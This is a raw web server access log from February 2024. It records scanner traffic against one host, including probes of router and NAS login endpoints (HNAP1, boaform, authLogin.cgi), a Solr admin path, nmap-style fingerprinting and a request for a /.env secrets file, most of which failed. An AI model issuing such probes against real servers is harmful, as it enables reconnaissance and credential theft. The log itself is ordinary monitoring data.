31.220.3.140 - - [13/Feb/2024:15:08:47 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
172.105.128.11 - - [13/Feb/2024:15:24:21 +0000] "\x16\x03\x01" 400 531 "-" "-"
185.180.143.15 - - [13/Feb/2024:15:38:53 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
12.235.110.190 - - [13/Feb/2024:15:50:58 +0000] "GET / HTTP/1.0" 400 61038 "-" "-"
146.19.24.28 - - [13/Feb/2024:15:52:05 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
78.153.140.175 - - [13/Feb/2024:15:55:32 +0000] "GET /.env HTTP/1.1" 404 2427 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.175 - - [13/Feb/2024:15:55:34 +0000] "\x16\x03\x01\x01H\x01" 400 531 "-" "-"
46.214.31.179 - - [13/Feb/2024:15:59:24 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.105.128.11 - - [13/Feb/2024:16:26:37 +0000] "\x16\x03\x01" 400 531 "-" "-"
45.128.232.40 - - [13/Feb/2024:16:58:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2488 "http://34.22.76.150:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
180.149.125.172 - - [13/Feb/2024:17:11:51 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
8.137.106.178 - - [13/Feb/2024:17:16:23 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 2398 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:08 +0000] "\x16\x03\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:23 +0000] "\x16\x03\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:34 +0000] "\x16\x03\x03\x01\xa5\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:34 +0000] "\x16\x03\x03\x01\xa5\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:35 +0000] "\x16\x03\x03\x01V\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:35 +0000] "\x16\x03\x03\x01H\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:36 +0000] "\x16\x03\x03\x01\x99\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:36 +0000] "\x16\x03\x02\x01\x9a\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:38 +0000] "\x16\x03\x01\x01\xa7\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:39 +0000] "\x16\x03\x01\x01\xa7\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:39 +0000] "\x16\x03\x01\x01\x9d\x01" 400 531 "-" "-"
103.56.61.130 - - [13/Feb/2024:17:26:40 +0000] "\x16\x03\x01\x01\xb4\x01" 400 531 "-" "-"
146.19.24.28 - - [13/Feb/2024:17:27:57 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
206.189.53.7 - - [13/Feb/2024:17:56:04 +0000] "GET / HTTP/1.0" 400 61656 "-" "-"
206.189.53.7 - - [13/Feb/2024:17:56:05 +0000] "POST /sdk HTTP/1.1" 404 2388 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
206.189.53.7 - - [13/Feb/2024:17:56:05 +0000] "GET /nmaplowercheck1707846965 HTTP/1.1" 404 2450 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
206.189.53.7 - - [13/Feb/2024:17:56:05 +0000] "GET / HTTP/1.0" 400 61656 "-" "-"
206.189.53.7 - - [13/Feb/2024:17:56:05 +0000] "GET /HNAP1 HTTP/1.1" 404 2393 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
206.189.53.7 - - [13/Feb/2024:17:56:05 +0000] "GET /evox/about HTTP/1.1" 404 2408 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
206.189.53.7 - - [13/Feb/2024:17:56:06 +0000] "GET / HTTP/1.0" 400 61655 "-" "-"
206.189.53.7 - - [13/Feb/2024:17:56:06 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
167.172.189.201 - - [13/Feb/2024:17:56:08 +0000] "\x16\x03\x01" 400 531 "-" "-"
167.172.189.201 - - [13/Feb/2024:17:56:08 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 2444 "-" "Go-http-client/1.1"
167.172.189.201 - - [13/Feb/2024:17:56:08 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
46.101.103.237 - - [13/Feb/2024:17:56:08 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 2447 "-" "Go-http-client/1.1"
